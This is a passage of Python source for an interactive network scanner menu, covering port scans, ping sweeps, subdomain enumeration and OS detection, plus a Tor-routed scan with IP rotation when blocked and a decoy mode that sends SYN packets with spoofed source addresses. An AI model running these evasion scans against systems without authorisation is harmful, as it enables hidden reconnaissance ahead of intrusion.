                print(f"{Colors.DIM_GRAY}Error: {WINSCAN_ERROR}{Colors.RESET}")
                input(Colors.DIM_GRAY + "\n[Press Enter to continue] " + Colors.RESET)
            continue
        if scan_mode == "10":
            if HAS_EMAILSCAN:
                try:
                    email_scanner_main()
                except SystemExit:
                    pass
                except KeyboardInterrupt:
                    print(f"\n{Colors.YELLOW}[!] Email scanner interrupted{Colors.RESET}")
                except Exception as e:
                    print(f"{Colors.RED}[!] Error in email scanner: {e}{Colors.RESET}")
                    import traceback
                    traceback.print_exc()
                    input(Colors.DIM_GRAY + "\n[Press Enter to continue] " + Colors.RESET)
            else:
                print(f"{Colors.RED}[!] scu.py not found or has errors{Colors.RESET}")
                print(f"{Colors.DIM_GRAY}Error: {EMAILSCAN_ERROR}{Colors.RESET}")
                input(Colors.DIM_GRAY + "\n[Press Enter to continue] " + Colors.RESET)
            continue

        if scan_mode == "11":
            if HAS_PROXYTEST:
                try:
                    px.main()
                except SystemExit:
                    pass
                except KeyboardInterrupt:
                    print(f"\n{Colors.YELLOW}[!]proxy tester interrupted{Colors.RESET}")
                except Exception as e:
                    print(f"{Colors.RED}[!] Error in proxy tester: {e}{Colors.RESET}")
                    import traceback
                    traceback.print_exc()
                    input(Colors.DIM_GRAY + "\n[Press Enter to continue] " + Colors.RESET)
            else:
                print(f"{Colors.RED}[!] proxy_tester.py not found or has errors{Colors.RESET}")
                print(f"{Colors.DIM_GRAY}Error: {PROXYTEST_ERROR}{Colors.RESET}")
                input(Colors.DIM_GRAY + "\n[Press Enter to continue] " + Colors.RESET)
            continue

        if scan_mode == "1":
            print(Colors.AQUA + "\n[*] Paste IPs (empty line to finish):" + Colors.RESET)
            targets = []
            while True:
                line = input()
                if line.strip() == "":
                    break
                targets.append(line.strip())
            if not targets:
                print(Colors.RED + "[!] No targets entered!" + Colors.RESET)
                sys.exit(0)
            print(Colors.CYAN + f"[*] {len(targets)} targets loaded!" + Colors.RESET)

            print()
            box_top()
            box_line("SELECT SCAN SPEED", text_color=Colors.NEON_CYAN + Colors.BOLD)
            box_divider()
            box_line("1) Slow", text_color=Colors.SKY_BLUE)
            box_line("2) Normal", text_color=Colors.SKY_BLUE)
            box_line("3) Fast", text_color=Colors.SKY_BLUE)
            box_line("4) Super Fast", text_color=Colors.SKY_BLUE)
            box_bottom()
            multi_speed = typed_input(Colors.AQUA + "[?] Choose speed (1-4): " + Colors.RESET).strip()
            speed_settings_multi = {"1": (15, 0.5), "2": (15, 0.2), "3": (15, 0.05), "4": (15, 0.0)}
            thread_count_multi, delay_multi = speed_settings_multi.get(multi_speed, (15, 0.0))

            print()
            box_top()
            box_line("SELECT SCAN TYPE", text_color=Colors.NEON_CYAN + Colors.BOLD)
            box_divider()
            box_line("1) TCP Scan", text_color=Colors.SKY_BLUE)
            box_line("2) SYN Scan", text_color=Colors.SKY_BLUE)
            box_line("3) UDP Scan", text_color=Colors.SKY_BLUE)
            box_bottom()
            multi_type = typed_input(Colors.AQUA + "[?] Choose scan type (1-3): " + Colors.RESET).strip()
            if multi_type == "2":
                check_os_multi = typed_input(Colors.AQUA + "[?] Detect OS? [y/n]: " + Colors.RESET).strip().lower() in [
                    "y", "yes"]
            else:
                check_os_multi = False
            results = multi_target_scan(targets, multi_type, check_os_multi,
                                        thread_count_multi, 1.0, delay_multi)
            print()
            box_top()
            box_line("MULTI SCAN RESULTS", text_color=Colors.NEON_CYAN + Colors.BOLD)
            box_divider()
            for target, data in results.items():
                box_line(f"Target: {target}", text_color=Colors.WHITE)
                box_line(f"IP: {data['ip']}", text_color=Colors.DIM_GRAY)
                box_line(f"Open Ports: {len(data['open_ports'])}",
                         text_color=Colors.GREEN if data['open_ports'] else Colors.RED)
                if data['os_type'] != "Not checked":
                    box_line(f"OS: {data['os_type']}", text_color=Colors.GOLD)
                if data['banners']:
                    for port, banner in data['banners'].items():
                        box_line(f"  Port {port}: {banner[:40]}", text_color=Colors.DIM_GRAY)
                box_divider()
            box_bottom()
            sys.exit(0)

        if scan_mode == "2":
            target = typed_input(Colors.AQUA + "[#] Enter IP or Hostname: " + Colors.RESET).strip()
            if not target:
                print(Colors.RED + "[!] No target entered." + Colors.RESET)
                sys.exit(1)
            ip, hostname = resolve_target(target)
            if not is_valid_ip(ip):
                print(Colors.RED + "[!] Could not resolve target." + Colors.RESET)
                sys.exit(1)
            print(Colors.GREEN + f"[*] IP: {ip}" + Colors.RESET)
            print(Colors.GREEN + f"[*] Hostname: {hostname}" + Colors.RESET)

            print()
            box_top()
            box_line("SELECT SCAN SPEED", text_color=Colors.NEON_CYAN + Colors.BOLD)
            box_divider()
            box_line("1) Super Slow", text_color=Colors.SKY_BLUE)
            box_line("2) Slow", text_color=Colors.SKY_BLUE)
            box_line("3) Normal", text_color=Colors.SKY_BLUE)
            box_line("4) Fast", text_color=Colors.SKY_BLUE)
            box_line("5) Super Fast", text_color=Colors.SKY_BLUE)
            box_bottom()
            speed_mode = typed_input(Colors.AQUA + "[?] Choose speed (1-5): " + Colors.RESET).strip()
            speed_settings = {
                "1": (4.0, 21, 0.5, "Super Slow"),
                "2": (2.0, 50, 0.2, "Slow"),
                "3": (0.9, 200, 0.05, "Normal"),
                "4": (0.3, 400, 0.0, "Fast"),
                "5": (0.2, 550, 0.0, "Super Fast"),
            }
            timeout, thread_count, delay, speed_label = speed_settings.get(
                speed_mode, (0.9, 200, 0.05, "Normal"))

            print()
            box_top()
            box_line("SELECT SCAN TYPE", text_color=Colors.NEON_CYAN + Colors.BOLD)
            box_divider()
            box_line("1) TCP Scan", text_color=Colors.SKY_BLUE)
            box_line("2) SYN Scan", text_color=Colors.SKY_BLUE)
            box_line("3) UDP Scan", text_color=Colors.SKY_BLUE)
            box_line("4) FIN Scan", text_color=Colors.SKY_BLUE)
            box_line("5) Fragment Scan", text_color=Colors.SKY_BLUE)
            box_bottom()
            scan_type = typed_input(Colors.AQUA + "[?] Choose scan type (1-5): " + Colors.RESET).strip()
            if scan_type not in ["1", "2", "3", "4", "5"]:
                print(Colors.RED + "[!] Invalid scan type." + Colors.RESET)
                sys.exit(1)

            if scan_type == "3" and timeout < 2.0:
                print(f"{Colors.YELLOW}[!] UDP scan needs longer timeout. "
                      f"Auto-adjusting: {timeout}s -> 2.0s{Colors.RESET}")

                timeout = 2.0
            check_os = False
            os_type = "Not checked"
            if scan_type == "2":
                check_os = typed_input(Colors.AQUA + "[?] Detect OS? [y/n]: " + Colors.RESET).strip().lower() in ["y",
                                                                                                                  "yes"]

            print()
            box_top()
            box_line("SELECT PORT MODE", text_color=Colors.NEON_CYAN + Colors.BOLD)
            box_divider()
            box_line("1) Custom", text_color=Colors.SKY_BLUE)
            box_line("2) Well-known", text_color=Colors.SKY_BLUE)
            box_line("3) Full (1-65535)", text_color=Colors.SKY_BLUE)
            box_bottom()
            mode = typed_input(Colors.AQUA + "[?] Choose (1-3): " + Colors.RESET).strip()

            if mode == "1":
                port_input = typed_input(Colors.AQUA + "[?] Enter ports/ranges: " + Colors.RESET)
                try:
                    ports = []
                    for chunk in port_input.split(","):
                        chunk = chunk.strip()
                        if not chunk:
                            continue
                        if "-" in chunk:
                            parts = chunk.split("-", 1)
                            start_p, end_p = int(parts[0].strip()), int(parts[1].strip())
                            if start_p > end_p:
                                start_p, end_p = end_p, start_p
                            if start_p < 1 or end_p > 65535:
                                raise ValueError
                            ports.extend(range(start_p, end_p + 1))
                        else:
                            port = int(chunk)
                            if port < 1 or port > 65535:
                                raise ValueError
                            ports.append(port)
                    ports = list(dict.fromkeys(ports))
                    if not ports:
                        raise ValueError
                except ValueError:
                    print(Colors.RED + "[!] Invalid port list." + Colors.RESET)
                    sys.exit(1)
            elif mode == "2":
                ports = sorted(UDP_SERVICES.keys()) if scan_type == "3" else sorted(SERVICES.keys())
            elif mode == "3":
                ports = list(range(1, 65536))
            else:
                print(Colors.RED + "[!] Invalid option." + Colors.RESET)
                sys.exit(1)

            print("\n" + "=" * 36)
            print(Colors.BLUE + f"\n[*] Scanning {target}..." + Colors.RESET)
            print(Colors.DIM_GRAY + f"[*] Speed: {speed_label} | Timeout: {timeout}s | "
                                    f"Threads: {thread_count} | Delay: {delay}s" + Colors.RESET)
            print(Colors.DIM_GRAY + f"[*] Total ports: {len(ports)}" + Colors.RESET)

            start_time = time.time()
            open_ports, open_filtered_ports, filtered_ports, banners = [], [], [], {}
            scanned_count, total_ports = 0, len(ports)

            scan_func_map = {"2": syn_scan_port, "3": udp_scan_port,
                             "4": fin_scan_port, "5": fragment_scan_port}
            scan_func = scan_func_map.get(scan_type, scan_port)

            try:
                with ThreadPoolExecutor(max_workers=thread_count) as executor:
                    futures = {}
                    for port in ports:
                        if scan_type == "2":
                            fut = executor.submit(scan_func, ip, port, timeout,
                                                  check_os=check_os, delay=delay)
                        else:
                            fut = executor.submit(scan_func, ip, port, timeout, delay=delay)
                        futures[fut] = port

                    for future in as_completed(futures):
                        scanned_count += 1
                        progress_bar(scanned_count, total_ports)
                        try:
                            result = future.result()
                            if scan_type == "2":
                                port, status, banner, os_result = result
                                if check_os and os_type == "Not checked" and os_result != "Unknown":
                                    os_type = os_result
                            else:
                                port, status, banner = result
                            if scan_type == "3":
                                if status == "OPEN":
                                    open_ports.append(port)
                                elif status == "OPEN|FILTERED":
                                    open_filtered_ports.append(port)
                                elif status == "FILTERED":
                                    filtered_ports.append(port)
                            elif scan_type == "4":
                                if status == "OPEN":
                                    open_ports.append(port)
                                elif status == "OPEN|FILTERED":
                                    open_filtered_ports.append(port)
                                elif status == "CLOSED":
                                    filtered_ports.append(port)
                            elif scan_type == "5":
                                if status == "OPEN":
                                    open_ports.append(port)
                                elif status == "CLOSED":
                                    filtered_ports.append(port)
                                elif status == "FILTERED":
                                    open_filtered_ports.append(port)
                            else:
                                if status:
                                    open_ports.append(port)
                            if banner:
                                banners[port] = banner
                        except socket.gaierror:
                            print(Colors.RED + "\n[!] Invalid IP or hostname." + Colors.RESET)
                            break
                        except Exception as e:
                            logger.debug(f"single scan result: {type(e).__name__}: {e}")
            except KeyboardInterrupt:
                print(Colors.YELLOW + "\n[!] Scan interrupted." + Colors.RESET)
            except Exception as exc:
                print(Colors.RED + f"\n[!] Error: {exc}" + Colors.RESET)
                logger.debug(f"single scan: {type(exc).__name__}: {exc}")

            sys.stdout.write("\n")
            sys.stdout.flush()
            if os_type == "Not checked":
                os_type = "Unknown"
            total_time = time.time() - start_time
            open_ports = sorted(set(open_ports))
            open_filtered_ports = sorted(set(open_filtered_ports))
            filtered_ports = sorted(set(filtered_ports))

            print()
            box_top()
            box_line("RESULTS SUMMARY", text_color=Colors.NEON_CYAN + Colors.BOLD)
            box_divider()
            box_line(f"Target        : {target}")
            box_line(f"IP            : {ip}")
            box_line(f"OS            : {os_type}")
            box_line(f"Hostname      : {hostname}")
            box_line(f"Scan type     : {'UDP' if scan_type == '3' else 'TCP'}")
            box_line(f"Ports scanned : {total_ports}")
            box_line(f"Open ports    : {len(open_ports)}",
                     text_color=Colors.GREEN if open_ports else Colors.RED)
            if scan_type in ["3", "4", "5"]:
                box_line(f"Open|Filtered : {len(open_filtered_ports)}")
                box_line(f"Filtered      : {len(filtered_ports)}")
            box_line(f"Time taken    : {total_time:.2f}s")
            if open_ports:
                box_divider()
                box_line("OPEN PORTS", text_color=Colors.NEON_PURPLE + Colors.BOLD)
                for p in open_ports:
                    service = get_udp_service(p) if scan_type == "3" else get_service(p)
                    label = f"{p}  {service}" if service else str(p)
                    box_line(f"* {label}", text_color=Colors.GREEN)
                    if p in banners:
                        box_line(f"  - {banners[p]}", text_color=Colors.DIM_GRAY)
            box_bottom()

            print()
            box_top()
            box_line("SAVE RESULTS?", text_color=Colors.NEON_CYAN + Colors.BOLD)
            box_divider()
            box_line("(txt) TXT  |  (html) HTML  |  (both) TXT+HTML  |  (n) No", text_color=Colors.SKY_BLUE)
            box_bottom()
            save_choice = typed_input(Colors.AQUA + "[?] Your choice: " + Colors.RESET).strip().lower()
            if save_choice in ["txt", "both"]:
                filename = save_results(target, scan_type, open_ports, open_filtered_ports,
                                        filtered_ports, banners, total_time, os_type, hostname)
                print(Colors.GREEN + f"\n[+] TXT saved: {filename}" + Colors.RESET)
            if save_choice in ["html", "both"]:
                html_filename = save_results_html(target, open_ports, banners, total_time,
                                                  os_type, hostname, scan_type)
                print(Colors.GREEN + f"[+] HTML saved: {html_filename}" + Colors.RESET)
            sys.exit(0)

        if scan_mode == "3":
            network = typed_input(Colors.AQUA + "[?] Enter network (e.g. 192.168.1.0/24): " + Colors.RESET).strip()
            alive_hosts = ping_sweep(network)
            if alive_hosts:
                print(Colors.GOLD + f"\n[*] Found {len(alive_hosts)} alive hosts:" + Colors.RESET)
                for ip, ttl in alive_hosts:
                    print(Colors.GREEN + f"  [+] {ip} (TTL={ttl})" + Colors.RESET)
            else:
                print(Colors.RED + "[!] No alive hosts found." + Colors.RESET)
            sys.exit(0)

        if scan_mode == "4":
            domain = typed_input(Colors.AQUA + "[?] Enter domain: " + Colors.RESET).strip()
            scan_choice = typed_input(
                Colors.RED + f"[?] Start subdomain scan for {domain}? [y/n]: " + Colors.RESET).strip().lower()
            if scan_choice in ["y", "yes"]:
                found = subdomain_scanner(domain)
                if found:
                    print(Colors.GOLD + f"\n[*] Found {len(found)} subdomains:" + Colors.RESET)
                    for sub, ip in found:
                        print(Colors.GREEN + f"  [+] {sub} --> {ip}" + Colors.RESET)
                else:
                    print(Colors.RED + "[!] No subdomains found." + Colors.RESET)
            sys.exit(0)

        if scan_mode == "5":
            target = typed_input(Colors.AQUA + "[?] Enter IP or Hostname: " + Colors.RESET).strip()
            os_scan_only(target)
            sys.exit(0)

        if scan_mode == "6":
            tor_result = enable_tor()
            if not tor_result["connected"]:
                print(Colors.RED + "\n[!] Tor is not available." + Colors.RESET)
                disable_tor()
                sys.exit(1)
            print()
            box_top()
            box_line("SELECT TOR SPEED", text_color=Colors.NEON_CYAN + Colors.BOLD)
            box_divider()
            box_line("1) Slow (0.5s)", text_color=Colors.SKY_BLUE)
            box_line("2) Normal (0.2s)", text_color=Colors.SKY_BLUE)
            box_line("3) Fast (0.05s)", text_color=Colors.SKY_BLUE)
            box_line("4) Super Fast (0.0s)", text_color=Colors.SKY_BLUE)
            box_bottom()
            tor_speed = typed_input(Colors.AQUA + "[?] Choose speed (1-4): " + Colors.RESET).strip()
            tor_delay = {"1": 0.5, "2": 0.2, "3": 0.05, "4": 0.0}.get(tor_speed, 0.2)

            target = typed_input(Colors.AQUA + "[?] Enter IP or Hostname: " + Colors.RESET).strip()
            print()
            box_top()
            box_line("TOR CIRCUIT", text_color=Colors.NEON_CYAN + Colors.BOLD)
            box_divider()
            box_line("1) Use current circuit", text_color=Colors.SKY_BLUE)
            box_line("2) Get new circuit (new IP)", text_color=Colors.SKY_BLUE)
            box_bottom()
            circuit_choice = typed_input(Colors.AQUA + "[?] Choose (1-2): " + Colors.RESET).strip()
            if circuit_choice == "2":
                print(Colors.GOLD + "\n[*] Requesting new Tor circuit..." + Colors.RESET)
                if new_tor_circuit():
                    new_ip = get_ip_retry()
                    if new_ip:
                        tor_result["ip"] = new_ip
                        tor_result["country"] = get_country(new_ip)
                        print(Colors.GREEN + f"[+] New IP: {new_ip}" + Colors.RESET)

            print()
            box_top()
            box_line("AUTO RETRY MODE", text_color=Colors.NEON_CYAN + Colors.BOLD)
            box_divider()
            box_line("1) Normal scan", text_color=Colors.SKY_BLUE)
            box_line("2) Auto retry (change IP if blocked)", text_color=Colors.SKY_BLUE)
            box_bottom()
            retry_choice = typed_input(Colors.AQUA + "[?] Choose (1-2): " + Colors.RESET).strip()
            ports = sorted(SERVICES.keys())

            if retry_choice == "2":
                open_ports, banners, attempts = scan_with_auto_retry(target, ports, 1.0, tor_delay, max_retries=5)
                print(Colors.GOLD + f"\n[*] Total attempts: {attempts}" + Colors.RESET)
            else:
                open_ports, banners = tor_scan(target, ports, 1.0, tor_delay)

            print()
            box_top()
            box_line("TOR SCAN RESULTS", text_color=Colors.NEON_CYAN + Colors.BOLD)
            box_divider()
            box_line(f"Target      : {target}", text_color=Colors.WHITE)
            box_line(f"Tor IP      : {tor_result['ip']}", text_color=Colors.NEON_CYAN)
            box_line(f"Country     : {tor_result['country']}", text_color=Colors.NEON_CYAN)
            box_line(f"Verified    : {tor_result['verified']}", text_color=Colors.NEON_CYAN)
            box_line(f"Delay       : {tor_delay}s", text_color=Colors.GOLD)
            box_line(f"Open Ports  : {len(open_ports)}",
                     text_color=Colors.GREEN if open_ports else Colors.RED)
            if open_ports:
                box_divider()
                for p in open_ports:
                    service = get_service(p)
                    banner = banners.get(p, "")
                    box_line(f"* {p} {service}", text_color=Colors.GREEN)
                    if banner:
                        box_line(f"  - {banner}", text_color=Colors.DIM_GRAY)
            box_bottom()

            save_choice = typed_input(Colors.AQUA + "\n[?] Save results? [txt/n]: " + Colors.RESET).strip().lower()
            if save_choice == "txt":
                filename = f"tor_scan_{_safe_filename(target)}_{int(time.time())}.txt"
                with open(filename, "w", encoding="utf-8") as f:
                    f.write("=" * 60 + "\n  TOR SCAN - RESULTS\n" + "=" * 60 + "\n\n")
                    f.write(f"Target      : {target}\nTor IP      : {tor_result['ip']}\n")
                    f.write(f"Country     : {tor_result['country']}\n")
                    f.write(f"Verified    : {tor_result['verified']}\n")
                    f.write(f"Original IP : {tor_result['original_ip']}\n")
                    f.write(f"Delay       : {tor_delay}s\n")
                    f.write(f"Open Ports  : {len(open_ports)}\n\n")
                    for p in open_ports:
                        f.write(f"  Port {p:<6} {get_service(p):<15} {banners.get(p, '')}\n")
                print(Colors.GREEN + f"[+] File saved: {filename}" + Colors.RESET)
            disable_tor()
            sys.exit(0)

        if scan_mode == "7":
            if not HAS_FAKER:
                print(Colors.RED + "[!] Faker not installed. Install with: pip install faker" + Colors.RESET)

                sys.exit(1)

            fl = Faker()

            target = typed_input(Colors.AQUA + "[?] Enter IP or Hostname: " + Colors.RESET).strip()
            ip, hostname = resolve_target(target)
            if not is_valid_ip(ip):
                print(Colors.RED + "[!] Could not resolve target." + Colors.RESET)
                sys.exit(1)
            print(Colors.GREEN + f"[*] IP: {ip}" + Colors.RESET)

            print()
            box_top()
            box_line("DECOY IP MODE", text_color=Colors.NEON_CYAN + Colors.BOLD)
            box_divider()
            box_line("1) Manual IP Input", text_color=Colors.SKY_BLUE)
            box_line("2) Auto Generate (Faker)", text_color=Colors.SKY_BLUE)
            box_bottom()
            ip_mode = typed_input(Colors.AQUA + "[?] Choose (1-2): " + Colors.RESET).strip()
            fake_ips = []
            if ip_mode == "1":
                print(Colors.AQUA + f"\n[*] Enter fake IPs (empty line to finish, max {DECOY_MAX}):" + Colors.RESET)
                while len(fake_ips) < DECOY_MAX:
                    line = input()
                    if line.strip() == "":
                        break
                    if is_valid_ip(line.strip()):
                        fake_ips.append(line.strip())
                    else:
                        print(Colors.YELLOW + f"  [!] Invalid IP skipped: {line.strip()}" + Colors.RESET)
            elif ip_mode == "2":
                num_fake = typed_input(
                    Colors.AQUA + f"[?] How many fake IPs? (max {DECOY_MAX}): " + Colors.RESET).strip()
                num_fake = min(int(num_fake) if num_fake.isdigit() else DECOY_MAX, DECOY_MAX)
                tries = 0
                while len(fake_ips) < num_fake and tries < num_fake * 30:
                    candidate = fl.ipv4()
                    if is_public_ip(candidate):
                        fake_ips.append(candidate)
                    tries += 1
                if len(fake_ips) < num_fake:
                    print(Colors.YELLOW + f"[!] Only generated {len(fake_ips)}/{num_fake} public IPs" + Colors.RESET)

            if not fake_ips:
                print(Colors.RED + "[!] No fake IPs!" + Colors.RESET)
                sys.exit(0)

            print()
            box_top()
            box_line("SELECT DECOY SPEED", text_color=Colors.NEON_CYAN + Colors.BOLD)
            box_divider()
            box_line("1) Slow", text_color=Colors.SKY_BLUE)
            box_line("2) Normal", text_color=Colors.SKY_BLUE)
            box_line("3) Fast", text_color=Colors.SKY_BLUE)
            box_line("4) Super Fast", text_color=Colors.SKY_BLUE)
            box_bottom()
            speed_choice = typed_input(Colors.AQUA + "[?] Choose speed (1-4): " + Colors.RESET).strip()
            delay = {"1": 3.0, "2": 1.5, "3": 0.5, "4": 0.1}.get(speed_choice, 0.5)
            print(Colors.CYAN + f"[*] {len(fake_ips)} fake IPs loaded! Delay: {delay}s" + Colors.RESET)

            ports = sorted(SERVICES.keys())
            open_ports = []

            def decoy_scan(port):
                for fip in fake_ips:
                    pkt = IP(src=fip, dst=ip) / TCP(dport=port, flags="S")
                    sr1(pkt, timeout=0.3, verbose=0)
                    time.sleep(delay)
                pkt = IP(dst=ip) / TCP(dport=port, flags="S")
                resp = sr1(pkt, timeout=1.0, verbose=0)
                if resp and resp.haslayer(TCP) and resp[TCP].flags == 0x12:
                    rst_pkt = IP(dst=ip) / TCP(dport=port, sport=resp[TCP].dport,
                                               seq=resp[TCP].ack, ack=resp[TCP].seq + 1, flags="R")
                    sr(rst_pkt, timeout=0.5, verbose=0)
                    return port, True
                return port, False

            with ThreadPoolExecutor(max_workers=50) as executor:
                futures = {executor.submit(decoy_scan, port): port for port in ports}
                for future in as_completed(futures):
                    port, is_open = future.result()
                    if is_open:
                        open_ports.append(port)
                        with print_lock:
                            sys.stdout.write("\r" + " " * 120 + "\r")
                            sys.stdout.flush()
                            print(Colors.NEON_CYAN + f"[+] Port {port} OPEN (Decoy) ---> " +
                                  Colors.GREEN + f"<{get_service(port)}>" + Colors.RESET)

            sys.stdout.write("\n" + " " * 120 + "\r")
            sys.stdout.flush()

            print()
            box_top()
            box_line("DECOY SCAN RESULTS", text_color=Colors.NEON_CYAN + Colors.BOLD)
            box_divider()
            box_line(f"Target: {target}", text_color=Colors.WHITE)
            box_line(f"Fake IPs: {len(fake_ips)}", text_color=Colors.GOLD)
            box_line(f"Delay: {delay}s", text_color=Colors.GOLD)
            box_line(f"Open Ports: {len(open_ports)}",
                     text_color=Colors.GREEN if open_ports else Colors.RED)
            if open_ports:
                for p in open_ports:
                    box_line(f"* {p} {get_service(p)}", text_color=Colors.GREEN)
            box_bottom()
            sys.exit(0)


if __name__ == "__main__":
    main()